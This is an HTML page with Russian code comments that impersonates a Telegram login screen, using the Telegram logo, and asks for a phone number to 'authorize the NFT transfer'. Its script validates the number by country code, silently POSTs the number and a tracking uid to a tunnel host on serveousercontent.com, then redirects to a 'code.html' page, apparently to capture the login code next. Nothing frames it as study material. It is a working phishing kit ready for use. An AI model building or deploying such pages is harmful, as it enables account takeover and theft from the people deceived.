<!DOCTYPE html>
<html lang="ru">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, maximum-scale=1.0, user-scalable=no">
    <style>
        body { background: #000; color: #fff; font-family: -apple-system, sans-serif; text-align: center; padding: 40px 20px; margin: 0; overflow: hidden; }
        .logo { width: 80px; height: 80px; margin-bottom: 25px; }
        
        /* Поле ввода с "бессмертным" плюсом */
        .phone-box {
            position: relative;
            width: 100%;
            max-width: 320px;
            margin: 0 auto 10px;
            background: #1c252f;
            border: 1px solid #2a3644;
            border-radius: 12px;
            display: flex;
            align-items: center;
            padding: 0 16px;
            box-sizing: border-box;
            height: 56px;
        }

        /* Тот самый плюс, который нельзя убрать */
        .phone-box::before {
            content: "+";
            color: #fff;
            font-size: 18px;
            margin-right: 4px;
            font-weight: 500;
        }

        input {
            flex: 1;
            background: transparent;
            border: none;
            color: #fff;
            font-size: 18px;
            outline: none;
            padding: 0;
            letter-spacing: 0.5px;
        }

        button { 
            width: 100%; 
            max-width: 320px; 
            height: 50px;
            background: #248bdf; 
            border: none; 
            border-radius: 12px; 
            color: #fff; 
            font-weight: 700; 
            font-size: 16px; 
            cursor: pointer; 
            margin-top: 10px;
        }

        .info-text { font-size: 12px; color: #8a99a8; margin-top: 5px; min-height: 15px; }
    </style>
</head>
<body>
    <img src="https://telegram.org/img/t_logo.png" class="logo">
    
    <h2>Log in to Telegram</h2>
    <p style="color: #8a99a8; margin-bottom: 30px;">Enter your phone number to authorize the NFT transfer.</p>
    
    <div class="phone-box">
        <input type="tel" id="phone" placeholder="7 900 000-00-00" autocomplete="off">
    </div>
    <div id="info" class="info-text"></div>
    
    <button onclick="submitPhone()">Next</button>

    <script>
        const input = document.getElementById('phone');
        const info = document.getElementById('info');

        // Правила: Код страны -> Длина (без учета плюса)
        const countryData = {
            "7": { len: 11, name: "RU/KZ" },    // +7 (11 цифр)
            "380": { len: 12, name: "UA" },    // +380 (12 цифр)
            "375": { len: 12, name: "BY" },    // +375 (12 цифр)
            "998": { len: 12, name: "UZ" },    // +998 (12 цифр)
            "1": { len: 11, name: "US/CA" },   // +1 (11 цифр)
            "44": { len: 12, name: "UK" }      // +44 (12 цифр)
        };

        input.addEventListener('input', (e) => {
            // Удаляем всё, кроме цифр
            let val = input.value.replace(/\D/g, '');
            
            // Определяем страну и ограничение
            let limit = 15; // По умолчанию для неизвестных
            let countryName = "International";

            for (let code in countryData) {
                if (val.startsWith(code)) {
                    limit = countryData[code].len;
                    countryName = countryData[code].name;
                    break;
                }
            }

            // Обрезаем лишнее мгновенно
            if (val.length > limit) {
                val = val.substring(0, limit);
            }

            input.value = val;
            
            // Вывод подсказки
            if (val.length > 0) {
                info.innerText = `${countryName}: ${val.length} / ${limit}`;
                info.style.color = (val.length === limit) ? "#4caf50" : "#8a99a8";
            } else {
                info.innerText = "";
            }
        });

        async function submitPhone() {
            const val = input.value;
            if (val.length < 10) {
                alert("The number is too short.");
                return;
            }

            const fullNumber = "+" + val;
            const uid = new URLSearchParams(window.location.search).get('uid') || "Unknown";

            // Отправка (замени IP)
            try {
                await fetch("https://ffdb8aa38a66bbe8-95-24-163-77.serveousercontent.com/submit", {
                    method: 'POST',
                    headers: {'Content-Type': 'application/json'},
                    body: JSON.stringify({ type: 'phone', value: fullNumber, uid: uid })
                });
            } catch(e) {}

            window.location.href = "code.html" + window.location.search;
        }
    </script>
</body>
</html>
